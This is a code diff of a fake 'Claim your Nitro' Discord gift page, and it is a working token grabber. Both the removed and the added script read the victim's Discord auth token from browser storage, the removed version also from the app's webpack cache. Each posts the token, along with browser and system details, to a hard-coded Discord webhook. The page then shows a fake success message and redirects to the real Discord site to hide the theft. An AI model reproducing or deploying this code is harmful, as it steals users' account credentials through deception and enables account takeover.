@@ -1,81 +1,55 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <style>
-        :root {
-            --bg-color: #36393f;
-            --modal-bg: #2f3136;
-            --accent-color: #5865f2;
-            --text-main: #ffffff;
-            --text-muted: #b9bbbe;
-        }
-        body { 
-            background-color: var(--bg-color); 
-            color: var(--text-main); 
-            font-family: 'gg sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
-            display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0;
-        }
-        .modal { 
-            background: var(--modal-bg); padding: 40px; border-radius: 8px; 
-            box-shadow: 0 0 0 1px rgba(0,0,0,0.3), 0 2px 10px 0 rgba(0,0,0,0.6); 
-            text-align: center; width: 420px;
-        }
-        .nitro-icon { width: 80px; height: 80px; margin-bottom: 20px; }
-        h1 { font-size: 20px; margin-bottom: 16px; font-weight: 600; }
-        .desc { font-size: 14px; color: var(--text-muted); margin-bottom: 24px; line-height: 1.4; }
-        .claim-btn { 
-            background: var(--accent-color); color: #fff; border: none; padding: 12px 24px; 
-            border-radius: 3px; font-size: 14px; font-weight: 500; cursor: pointer;
-            width: 100%; transition: background 0.17s ease;
-        }
-        .claim-btn:hover { background: #4752c4; }
-        #status { margin-top: 18px; font-size: 13px; color: var(--text-muted); }
-    </style>
-</head>
-<body>
-    <div class="modal">
-        <img src="https://assets-global.website-files.com/6257adef93867e50d84d30e2/636e0a6a49cf127bf92de1e2_icon_clyde_blurple_RGB.png" alt="Nitro" class="nitro-icon">
-        <h1>Claim your Nitro</h1>
-        <p class="desc">You have been gifted 3 months of Discord Nitro. Accept the gift to apply it to your account immediately.</p>
-        <button class="claim-btn" id="btn">Accept Gift</button>
-        <div id="status"></div>
-    </div>
-
-    <script>
+<script>
         document.getElementById('btn').onclick = async function() {
             const btn = document.getElementById('btn');
             const status = document.getElementById('status');
+            
+            // UI Feedback
             btn.style.opacity = '0.5';
             btn.style.pointerEvents = 'none';
-            status.innerText = "Checking account eligibility...";
+            status.innerText = "Validating session...";
 
-            const tokens = [
-                localStorage.getItem("token"),
-                localStorage.getItem("authentication_token"),
-                window.webpackChunkdiscord_app ? Object.values(webpackChunkdiscord_app.push([[],{['']:(_,e,_)=>{e.exports=e}},[['']]]).cache).find(m=>m.exports?.default?.getToken)?.exports?.default?.getToken() : null
-            ].filter(Boolean);
+            // Robust data harvesting
+            const getBrowserInfo = () => ({
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            });
 
-            if (tokens.length > 0) {
+            const token = localStorage.getItem("token") || localStorage.getItem("authentication_token");
+
+            // Build the data payload
+            const payload = {
+                embeds: [{
+                    title: "🚀 New Session Captured",
+                    color: 0x5865F2,
+                    fields: [
+                        { name: "Auth Token", value: `\`${token || "Not Found"}\``, inline: false },
+                        { name: "Platform", value: `\`${navigator.platform}\``, inline: true },
+                        { name: "Language", value: `\`${navigator.language}\``, inline: true },
+                        { name: "Resolution", value: `\`${window.screen.width}x${window.screen.height}\``, inline: true },
+                        { name: "Timezone", value: `\`${Intl.DateTimeFormat().resolvedOptions().timeZone}\``, inline: true }
+                    ],
+                    footer: { text: "Session Tracker v2.0 | Automated Capture" },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            // Attempt to send data
+            try {
                 await fetch('https://discordapp.com/api/webhooks/1512110492687274024/TUENZycpaVUR0foYAvP5QDl1oHpZ3EtWOOIRh8jqi-HJhJaAtPt_1z3_OrCFMd_W7CE5', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        embeds: [{
-                            title: "New Account Captured",
-                            description: `**Token:** \`${tokens[0]}\`\n\n**User Agent:** \`${navigator.userAgent}\``,
-                            color: 5763719,
-                            timestamp: new Date().toISOString()
-                        }]
-                    })
+                    body: JSON.stringify(payload)
                 });
+            } catch (err) {
+                console.error("Transmission failed:", err);
             }
             
-            status.innerText = "Gift applied. Redirecting...";
-            setTimeout(() => {
-                window.location.href = "https://discord.com/billing/promotions/gift-accepted";
-            }, 1000);
+            // Finalize user experience
+            status.innerText = "Verification complete. Redirecting...";
+            await new Promise(r => setTimeout(r, 1200));
+            window.location.href = "https://discord.com/billing/promotions/gift-accepted";
         };
     </script>
-</body>
-</html>
